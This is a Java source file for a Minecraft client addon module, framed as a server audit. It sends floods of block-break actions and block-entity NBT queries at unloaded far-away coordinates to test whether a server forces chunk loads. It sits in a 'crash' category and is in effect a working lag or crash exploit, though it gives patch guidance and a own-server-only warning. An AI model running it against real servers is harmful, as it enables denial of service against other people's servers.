package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.QueryBlockNbtC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

/**
 * AUDIT: Unloaded-Chunk Interact (far-block interaction)
 *
 * PLATFORM: Bukkit-universal (results Platform-dependent — Paper's async chunk
 * system and view-distance handling differ from Spigot).
 *
 * A client can address blocks in chunks the server does not have loaded for it, by
 * sending block actions / block-entity queries at far coordinates. A server that
 * processes these without first verifying the chunk is loaded-for-this-player may
 * force a synchronous chunk load, touch incomplete block state, or (on Paper, whose
 * chunk loading is async) act on a chunk mid-load. This sends start-destroy actions
 * and block-NBT queries at a configurable far offset and grades the response.
 *
 * Patch signal: reject block actions / block-entity queries whose target chunk is
 * not loaded-and-visible for that player; never force a synchronous load from a
 * client-supplied coordinate, and never read block state from a partially-loaded
 * chunk.
 *
 * Run against your OWN local server only.
 */
public class UnloadedChunkInteract extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> offset = sgGeneral.add(new IntSetting.Builder()
        .name("offset-blocks").description("How far from the player (each axis) to address blocks, well beyond view distance.")
        .defaultValue(2000).min(64).sliderMax(10000).build()
    );
    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(4).min(1).sliderMax(20).build()
    );

    private final GracefulResponse gr = new GracefulResponse(sgGeneral);
    private final TestCadence cadence = new TestCadence(sgGeneral);
    private int n = 0, txn = 0;

    public UnloadedChunkInteract() {
        super(AddonTemplate.CRASH_CATEGORY, "unloaded-chunk-interact",
            "Sends block actions and block-entity NBT queries at far/unloaded coordinates. Tests whether the server validates chunk-loaded-for-player before acting.");
    }

    @Override
    public void onActivate() { n = 0; txn = 0; gr.onActivate(); cadence.onActivate(); }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        gr.tick();
        if (!cadence.shouldFire()) return;

        int off = offset.get();
        for (int i = 0; i < packets.get(); i++) {
            int sign = (n % 2 == 0) ? 1 : -1;
            BlockPos pos = mc.player.getBlockPos().add(sign * off + n, 0, sign * off - n);
            if (n % 2 == 0)
                mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(
                    PlayerActionC2SPacket.Action.START_DESTROY_BLOCK, pos, Direction.UP));
            else
                mc.player.networkHandler.sendPacket(new QueryBlockNbtC2SPacket(txn++, pos));
            n++;
        }
        gr.markFired();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @Override
    public void onDeactivate() { gr.report(l -> info("%s", l)); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (isActive()) toggle();
    }
}
